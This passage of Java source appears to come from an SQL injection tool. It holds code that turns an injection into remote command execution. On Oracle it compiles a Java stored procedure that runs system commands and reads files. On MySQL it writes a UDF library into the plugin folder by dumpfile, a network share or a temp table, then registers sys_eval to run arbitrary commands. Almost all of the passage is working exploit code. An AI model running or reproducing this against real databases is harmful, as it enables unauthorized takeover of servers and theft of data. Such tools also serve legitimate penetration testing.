55      public void createExploitRce(ExploitMethod exploitMethod) throws JSqlException {
56          if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
57              LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit method not implemented, use query body instead");
58              return;
59          }
60  
61          var pattern = " ; drop java source \"%s\";";
62          this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_SRC), "body#drop-src");
63          pattern = " ; drop function %s;";
64          this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), "body#drop-src");
65          pattern = " ; %s ";
66          this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
67              "BEGIN",
68              "\\n",
69              "EXECUTE IMMEDIATE 'create or replace and compile java source named \"",
70              UdfAccess.RCE_JAVA_UTIL_SRC, "_SRC",
71              "\" as import java.io.*; public class ", UdfAccess.RCE_JAVA_UTIL_SRC, "_SRC{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
72              "\\n",
73              "END;"
74          )), "body#create-src");
75          this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
76              "BEGIN",
77              "\\n",
78              "EXECUTE IMMEDIATE 'create or replace function ",
79              UdfAccess.RCE_JAVA_UTIL_FUNC,
80              "(p_cmd in varchar2) return varchar2 as language java name ''",
81              UdfAccess.RCE_JAVA_UTIL_SRC,
82              ".runCmd(java.lang.String) return String'';';",
83              "\\n",
84              "END;"
85          )), "body#create-func");
86          this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
87              "BEGIN",
88              "\\n",

90              "\\n",
91              "END;"
92          )), "body#grant-exec");
93          var nameDatabase = this.getResult(
94              String.format(
95                  "SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM <= 1",
96                  VendorYaml.TRAIL_SQL,
97                  UdfAccess.RCE_JAVA_UTIL_FUNC
98              ),
99              "body#confirm"
100         );
101         if (!nameDatabase.contains(UdfAccess.RCE_JAVA_UTIL_FUNC)) {
102             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: java function not found");
103             return;
104         }
105         LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: java function found");
106

109         request.setParameters(null, null);
110         this.injectionModel.sendToViews(request);

113     public void createUdf(String pathNetshareFolder, ExploitMethod exploitMethod) throws JSqlException {
114         if (this.injectionModel.getResourceAccess().isReadingNotAllowed()) {
115             return;
116         }
117 
118         var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;
119         var pathPlugin = this.getResult("select@@plugin_dir", "udf#dir");
120         if (StringUtils.isEmpty(pathPlugin)) {
121             throw new JSqlException("Incorrect plugin folder: path is empty");
122         }
123 
124         var versionOsMachine = this.getResult("select concat(@@version_compile_os,@@version_compile_machine)", "udf#check-os");
125         if (StringUtils.isEmpty(versionOsMachine)) {
126             throw new JSqlException("Incorrect remote machine: unknown system");
127         }
128         var isWin = versionOsMachine.toLowerCase().contains("win") && !versionOsMachine.toLowerCase().contains("linux");
129 
130         String nameLibrary;
131         if (versionOsMachine.contains("64")) {
132             nameLibrary = isWin ? "64.dll" : "64.so";
133         } else {
134             nameLibrary = isWin ? "32.dll" : "32.so";
135         }
136 
137         pathPlugin = pathPlugin.replace("\\", "/");
138         if (!pathPlugin.endsWith("/")) {
139             pathPlugin = String.format("%s%s", pathPlugin, "/");
140         }
141 
142         if (!this.injectionModel.getMediatorStrategy().getStack().isApplicable()) {
143             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit UDF requires stack query, trying anyway...");
144         }
145         String isSuccess = StringUtils.EMPTY;
146         if (exploitMethod == ExploitMethod.NETSHARE) {
147             if (!pathNetshareFolder.endsWith("\\")) {
148                 pathNetshareFolder += "\\";
149             }
150             UdfAccess.copyToShare(pathNetshareFolder, nameLibrary);
151             isSuccess = this.byNetshare(
152                 nbIndexesFound,
153                 pathNetshareFolder,
154                 nameLibrary,
155                 pathPlugin,
156                 this.biPredConfirm
157             );
158         } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
159             if (StringUtil.GET.equals(this.injectionModel.getMediatorUtils().getConnectionUtil().getTypeRequest())) {
160                 LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "GET too limited for UDF with body query, should use POST instead but using GET anyway...");
161             }
162             isSuccess = this.byQueryBody(
163                 nbIndexesFound,
164                 pathPlugin,
165                 nameLibrary,
166                 UdfAccess.toHexChunks(nameLibrary),
167                 this.biPredConfirm
168             );
169         }
170         if (StringUtils.isEmpty(isSuccess) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
171             var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameLibrary;
172             this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);
173             this.biPredConfirm.test(pathPlugin, nameLibraryRandom);
174         }
175     }

177     public String byQueryBody(
178         int nbIndexesFound,
179         String pathRemoteFolder,
180         String nameExploit,
181         List<String> hexChunks,
182         BiPredicate<String,String> biPredConfirm
183     ) {
184         String nameExploitValidated = StringUtils.EMPTY;
185         var pattern = " %s SELECT %s 0x%s into dumpfile '%s'";
186 
187         var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
188         this.injectionModel.injectWithoutIndex(String.format(pattern,
189             "union",
190             "'',".repeat(nbIndexesFound),
191             String.join("", hexChunks),
192             pathRemoteFolder + nameExploitRandom
193         ), "body#union-dump");
194         if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
195             nameExploitValidated = nameExploitRandom;
196         }
197         if (StringUtils.isEmpty(nameExploitValidated)) {
198             LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Query body connection failure with union, trying with stack...");
199             nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
200             this.injectionModel.injectWithoutIndex(String.format(pattern,
201                 ";",
202                 StringUtils.EMPTY,
203                 String.join("", hexChunks),
204                 pathRemoteFolder + nameExploitRandom
205             ), "body#stack-dump");
206             if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
207                 nameExploitValidated = nameExploitRandom;
208             }
209         }
210         return nameExploitValidated;
211     }

213     public String byNetshare(
214         int nbIndexesFound,
215         String pathNetshareFolder,
216         String nameExploit,
217         String pathRemoteFolder,
218         BiPredicate<String,String> biPredConfirm
219     ) {
220         String nameExploitValidated = StringUtils.EMPTY;
221         var pathShareEncoded = pathNetshareFolder.replace("\\", "\\\\");
222         var pattern = " %s SELECT %s load_file('%s') into dumpfile '%s'";
223 
224         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and union...");
225         var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
226         this.injectionModel.injectWithoutIndex(String.format(pattern,
227             "union",
228             "'',".repeat(nbIndexesFound),
229             pathShareEncoded + nameExploit,
230             pathRemoteFolder + nameExploitRandom
231         ), "udf#share-union");
232         if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
233             nameExploitValidated = nameExploitRandom;
234         }
235         if (StringUtils.isEmpty(nameExploitValidated)) {
236             LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and stack...");
237             nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
238             this.injectionModel.injectWithoutIndex(String.format(pattern,
239                 ";",
240                 StringUtils.EMPTY,
241                 pathShareEncoded + nameExploit,
242                 pathRemoteFolder + nameExploitRandom
243             ), "udf#share-stack");
244             if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
245                 nameExploitValidated = nameExploitRandom;
246             }
247         }
248         return nameExploitValidated;
249     }

251     private static void copyToShare(String pathNetshare, String nameLibrary) throws JSqlException {
252         try {
253             URI original = Objects.requireNonNull(UdfAccess.class.getClassLoader().getResource("udf/" + nameLibrary)).toURI();
254             Path originalPath = new File(original).toPath();
255             Path copied = Paths.get(pathNetshare + nameLibrary);
256             Files.copy(originalPath, copied, StandardCopyOption.REPLACE_EXISTING);
257         } catch (IOException | URISyntaxException e) {
258             throw new JSqlException("Copy udf into local network share failure: " + e.getMessage());
259         }
260     }

262     public void byTable(List<String> bodyHexChunks, String pathRemoteFile) throws JSqlException {
263         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection with table and stack...");
264         var nameDatabase = this.getResult("select database()", "tbl#dbname");
265         if (StringUtils.isEmpty(nameDatabase) || StringUtil.INFORMATION_SCHEMA.equals(nameDatabase)) {
266             nameDatabase = "mysql";
267         }
268         var nameTableRandom = UdfAccess.NAME_TABLE +"_"+ RandomStringUtils.secure().nextAlphabetic(8);  // underscore required, dash not allowed
269         var nameSchemaTable = nameDatabase +"."+ nameTableRandom;
270         this.injectionModel.injectWithoutIndex("; drop table "+ nameSchemaTable, "tbl#tbl");
271         var countResult = this.getCountTable(nameDatabase, nameTableRandom);
272         if (!"0".equals(countResult)) {
273             throw new JSqlException("Drop table failure: "+ countResult);
274         }
275         this.injectionModel.injectWithoutIndex("; create table "+ nameSchemaTable +"(data longblob)", "tbl#create");
276         countResult = this.getCountTable(nameDatabase, nameTableRandom);
277         if (!"1".equals(countResult)) {
278             throw new JSqlException("Create table failure: "+ countResult);
279         }
280         int indexChunk = 0;
281         for (String chunk: bodyHexChunks) {
282             if (indexChunk == 0) {
283                 this.injectionModel.injectWithoutIndex("; insert into "+ nameSchemaTable +"(data) values (0x"+chunk+")", "tbl#init");
284             } else {
285                 this.injectionModel.injectWithoutIndex("; update "+ nameSchemaTable +" set data = concat(data,0x"+chunk+")", "tbl#fill");
286             }
287             indexChunk++;
288         }
289         this.injectionModel.injectWithoutIndex("; select data from "+ nameSchemaTable +" into dumpfile '"+ pathRemoteFile +"'", "tbl#dump");
290     }

293         try {

296                 "where table_type like 'base table' and table_name = '"+ nameTableRandom +"' " +
297                 "and table_schema = '" + nameDatabase + "'",
298                 "tbl#check"

300         } catch (JSqlException e) {
301             return e.getMessage();  // error message then logged

305     private boolean buildSysEval(String nameLibrary) throws JSqlException {
306         this.injectionModel.injectWithoutIndex("; drop function sys_eval", "udf#del-func");
307         this.injectionModel.injectWithoutIndex(
308             "; create function sys_eval returns string soname '"+ nameLibrary +"'",
309             "udf#function"
310         );
311         var confirm = this.getResult("select group_concat(name)from mysql.func", "udf#confirm");
312         if (!confirm.contains("sys_eval")) {
313             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "UDF failure: sys_eval not found");
314             return false;
315         }
316         LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "UDF successful: sys_eval found");
317 
318         var request = new Request();
319         request.setMessage(Interaction.ADD_TAB_EXPLOIT_UDF);
320         request.setParameters(null, null);
321         this.injectionModel.sendToViews(request);
322         return true;
323     }

325     public String runCommandRce(String command, UUID uuidShell) {
326         String result;
327         try {
328             result = this.getResult(
329                 String.format(
330                     "SELECT %s('%s')||'%s' FROM dual",
331                     UdfAccess.RCE_JAVA_UTIL_FUNC,
332                     command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
333                     VendorYaml.TRAIL_SQL
334                 ),
335                 "rce#run-cmd"
336             );
337         } catch (JSqlException e) {
338             result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
339         }
340         var request = new Request();
341         request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
342         request.setParameters(uuidShell, result);
343         this.injectionModel.sendToViews(request);
344         return result;
345     }

347     public String runCommand(String command, UUID uuidShell) {
348         String result;
349         try {
350             result = this.getResult(  // 0xff splits single result in many chunks => replace by space
351                 "select cast(replace(sys_eval('"+ command +"'),0xff,0x20)as char(70000) character set utf8)",
352                 "udf#run-cmd"
353             );
354         } catch (JSqlException e) {
355             result = "Command failure: "+ e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
356         }
357         var request = new Request();
358         request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);
359         request.setParameters(uuidShell, result);
360         this.injectionModel.sendToViews(request);
361         return result;
362     }

364     private static List<String> toHexChunks(String filename) throws JSqlException {
365         try {
366             byte[] fileData = Objects.requireNonNull(  // getResource > toURI > toPath > readAllBytes() not possible in .jar
367                 UdfAccess.class.getClassLoader().getResourceAsStream("udf/"+ filename +".cloak")
368             ).readAllBytes();
369             fileData = StringUtil.uncloak(fileData);
370             return StringUtil.toHexChunks(fileData);
371         } catch (IOException e) {
372             throw new JSqlException(e);
373         }
374     }
